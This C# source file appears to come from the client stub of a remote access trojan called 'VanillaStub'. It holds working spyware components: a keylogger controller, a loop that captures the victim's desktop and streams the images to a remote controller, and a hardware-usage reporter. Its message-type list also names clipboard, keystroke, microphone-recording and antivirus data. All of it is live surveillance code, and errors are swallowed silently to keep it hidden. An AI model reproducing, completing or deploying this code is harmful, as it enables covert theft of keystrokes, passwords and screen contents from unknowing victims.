using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using VanillaStub.Helpers.Services.StreamLibrary;
using VanillaStub.Helpers.Services.StreamLibrary.UnsafeCodecs;

namespace VanillaStub.Helpers.Services
{
    public static class KeyloggerStream
    {
        public static bool KeyloggerActive { get; set; }
        public static Keylogger K = new Keylogger();
        private static Thread KeyloggerThread = new Thread(StartKeylogger);

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!KeyloggerActive)
            {
                KeyloggerActive = true;
                Keylogger.SendKeys = true;
                try
                {
                    KeyloggerThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (KeyloggerActive)
            {
                KeyloggerActive = false;
                Keylogger.SendKeys = false;
                try
                {
                    KeyloggerThread.Abort();
                    KeyloggerThread = new Thread(StartKeylogger);
                }
                catch { }
            }
        }

        private static void StartKeylogger()
        {
            K.InitKeylogger();
        }
    }

    public static class HardwareUsageStream
    {
        public static bool HardwareUsageActive { get; set; }
        private static Thread HardwareUsageThread = new Thread(StartHardwareUsage);

        //Data type enum
        public enum DataType
        {
            ImageType = 0,
            NotificationType = 1,
            ClientTag = 2,
            ProcessType = 3,
            InformationType = 4,
            FilesListType = 5,
            CurrentDirectoryType = 6,
            DirectoryUpType = 7,
            FileType = 8,
            ClipboardType = 9,
            HardwareUsageType = 10,
            KeystrokeType = 11,
            CurrentWindowType = 12,
            MicrophoneRecordingType = 13,
            AntiVirusTag = 14,
            WindowsVersionTag = 15,
            MessageType = 16
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!HardwareUsageActive)
            {
                HardwareUsageActive = true;
                try
                {
                    HardwareUsageThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (HardwareUsageActive)
            {
                HardwareUsageActive = false;
                try
                {
                    HardwareUsageThread.Abort();
                    HardwareUsageThread = new Thread(StartHardwareUsage);
                }
                catch { }
            }
        }

        public static void StartHardwareUsage()
        {
            PerformanceCounter PCCPU = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            PerformanceCounter PCMEM = new PerformanceCounter("Memory", "Available MBytes");
            PerformanceCounter PCDISK = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");
            while (HardwareUsageActive)
            {
                string Values = "{" + PCCPU.NextValue() + "}[" + PCMEM.NextValue() + "]<" + PCDISK.NextValue() + ">";
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.HardwareUsageType);
                ToSend.AddRange(Encoding.ASCII.GetBytes(Values));
                Networking.Networking.MainClient.Send(ToSend.ToArray());
                Thread.Sleep(500);
            }
        }
    }

    public static class RemoteDesktopStream
    {
        public static bool RemoteDesktopActive { get; set; }
        private static Thread RemoteDestkopThread = new Thread(StartRemoteDestkop);      

        //Data type enum
        public enum DataType
        {
            ImageType = 0,
            NotificationType = 1,
            ClientTag = 2,
            ProcessType = 3,
            InformationType = 4,
            FilesListType = 5,
            CurrentDirectoryType = 6,
            DirectoryUpType = 7,
            FileType = 8,
            ClipboardType = 9,
            HardwareUsageType = 10,
            KeystrokeType = 11,
            CurrentWindowType = 12,
            MicrophoneRecordingType = 13,
            AntiVirusTag = 14,
            WindowsVersionTag = 15,
            MessageType = 16
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!RemoteDesktopActive)
            {
                RemoteDesktopActive = true;
                try
                {
                    RemoteDestkopThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (RemoteDesktopActive)
            {
                RemoteDesktopActive = false;
                try
                {
                    RemoteDestkopThread.Abort();
                    RemoteDestkopThread = new Thread(StartRemoteDestkop);
                }
                catch { }
            }
        }

        private static async void StartRemoteDestkop()
        {
            while (RemoteDesktopActive)
            {
                byte[] ImageBytes = null;
                IUnsafeCodec UC = new UnsafeStreamCodec(50);
                Bitmap Image = GetDesktopImage();
                Rectangle Rect = new Rectangle(0, 0, Image.Width, Image.Height);
                Size S = new Size(Image.Width, Image.Height);
                BitmapData BD = Image.LockBits(new Rectangle(0, 0, Image.Width, Image.Height),
                    ImageLockMode.ReadWrite, Image.PixelFormat);
                using (MemoryStream MS = new MemoryStream(100000000))
                {
                    UC.CodeImage(BD.Scan0, Rect, S,
                        Image.PixelFormat, MS);
                    ImageBytes = MS.ToArray();
                }
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.ImageType);
                ToSend.AddRange(ImageBytes);
                Networking.Networking.MainClient.Send(ToSend.ToArray());
                Image.UnlockBits(BD);
                Image.Dispose();
                await Task.Delay(1);
            }
        }

        //Get image of desktop
        private static Bitmap GetDesktopImage()
        {
            Rectangle Rect = Screen.PrimaryScreen.Bounds;
            try
            {
                Bitmap BMP = new Bitmap(Rect.Width, Rect.Height, PixelFormat.Format32bppPArgb);
                Graphics G = Graphics.FromImage(BMP);
                G.CopyFromScreen(0, 0, 0, 0, new Size(BMP.Width, BMP.Height), CopyPixelOperation.SourceCopy);
                G.Dispose();
                return BMP;
            }
            catch { return new Bitmap(Rect.Width, Rect.Height); }
        }
    }
}